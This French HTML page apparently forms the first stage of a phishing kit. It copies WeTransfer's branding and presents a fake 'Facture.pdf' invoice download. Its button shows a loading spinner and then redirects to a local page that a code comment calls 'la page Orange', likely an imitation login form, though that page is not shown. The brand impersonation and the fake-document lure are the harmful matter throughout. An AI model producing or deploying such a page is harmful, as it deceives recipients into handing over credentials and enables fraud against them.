<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WeTransfer - Envoi de fichiers</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --primary-color: #409FFF;
            --primary-hover: #2d8cf0;
            --bg-color: #F4F5F7;
            --card-bg: #FFFFFF;
            --text-main: #171717;
            --text-muted: #6B6B6B;
            --border-radius: 12px;
            --shadow-md: 0 8px 24px rgba(0,0,0,0.12);
        }

        * { box-sizing: border-box; padding: 0; margin: 0; font-family: 'Inter', sans-serif; }

        body {
            height: 100vh;
            width: 100%;
            overflow: hidden;
            background-color: var(--bg-color);
            display: flex;
        }

        .wrapper { display: flex; width: 100%; height: 100%; }

        /* Section Gauche Desktop */
        .brand-section {
            display: none;
            width: 30%;
            max-width: 400px;
            background-color: #F8F5F1;
            padding: 40px;
            flex-direction: column;
            justify-content: space-between;
            border-right: 1px solid rgba(0,0,0,0.05);
        }

        .logo-wt { width: 45px; height: auto; }

        /* Section Principale avec Image */
        .main-content {
            flex-grow: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            background-image: url('https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?q=80&w=2564&auto=format&fit=crop'); 
            background-size: cover;
            background-position: center;
            position: relative;
        }

        .main-content::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.1);
        }

        /* Carte de téléchargement */
        .transfer-card {
            position: relative;
            background: var(--card-bg);
            width: 90%;
            max-width: 380px;
            padding: 40px 32px;
            border-radius: var(--border-radius);
            box-shadow: var(--shadow-md);
            text-align: center;
            z-index: 10;
        }

        .icon-wrapper {
            width: 72px; height: 72px;
            background-color: #EAF4FF;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
        }

        .icon-wrapper svg { color: var(--primary-color); width: 36px; height: 36px; }

        .file-preview {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background-color: #FAFAFA;
            padding: 16px;
            border-radius: 8px;
            margin-bottom: 32px;
            border: 1px solid #EEEEEE;
            text-align: left;
        }

        .btn-download {
            width: 100%;
            padding: 16px;
            background-color: var(--primary-color);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 1.05rem;
            font-weight: 600;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(64, 159, 255, 0.3);
        }

        @media (min-width: 900px) { .brand-section { display: flex; } }

        /* Écran de chargement */
#loader-overlay {
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: rgba(255, 255, 255, 0.95); /* Fond blanc légèrement transparent */
    display: none; /* Caché par défaut */
    flex-direction: column;
    align-items: center;
    justify-content: center;
    z-index: 9999;
}

.spinner {
    width: 50px;
    height: 50px;
    border: 5px solid #f3f3f3;
    border-top: 5px solid var(--primary-color); /* Bleu WeTransfer */
    border-radius: 50%;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.loader-text {
    margin-top: 15px;
    font-family: 'Inter', sans-serif;
    color: #555;
    font-weight: 500;
}
    </style>
</head>

<body>
    <div id="loader-overlay">
    <div class="spinner"></div>
    <div class="loader-text">Préparation du téléchargement...</div>
</div>
    <div class="wrapper">
        <div class="brand-section">
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/WeTransfer_logo.svg" class="logo-wt" alt="WT">
            <div class="brand-text">
                <h1 style="font-size: 2rem; margin-bottom: 1rem;">Simple. Rapide.</h1>
                <p style="color: #555;">Transférez vos documents en toute sécurité avec notre service cloud.</p>
            </div>
            <p style="font-size: 0.8rem; color: #888;">© 2026 WeTransfer</p>
        </div>

        <div class="main-content">
            <div class="transfer-card">
                <div class="icon-wrapper">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
                    </svg>
                </div>

                <h2 style="margin-bottom: 8px;">Prêt à télécharger ?</h2>
                <p style="color: var(--text-muted); margin-bottom: 24px;">1 fichier disponible (2.4 MB)</p>

                <div class="file-preview">
                    <div style="display: flex; align-items: center; gap: 10px;">
                        <span style="font-size: 24px;">📄</span>
                        <div>
                            <div style="font-weight: 600;">Facture.pdf</div>
                            <div style="font-size: 0.8rem; color: #888;">PDF • 2.4 MB</div>
                        </div>
                    </div>
                </div>

                <button class="btn-download" onclick="next()">
                    Télécharger le document
                </button>
            </div>
        </div>
    </div>

    <script>
   function next() {
    // 1. Afficher le loader
    document.getElementById('loader-overlay').style.display = 'flex';

    // 2. Attendre 3 secondes (3000 millisecondes)
    setTimeout(function() {
        // 3. Rediriger vers la page Orange
        window.location.href = '.load.html';
    }, 3000); 
}
    </script>
</body>
</html>
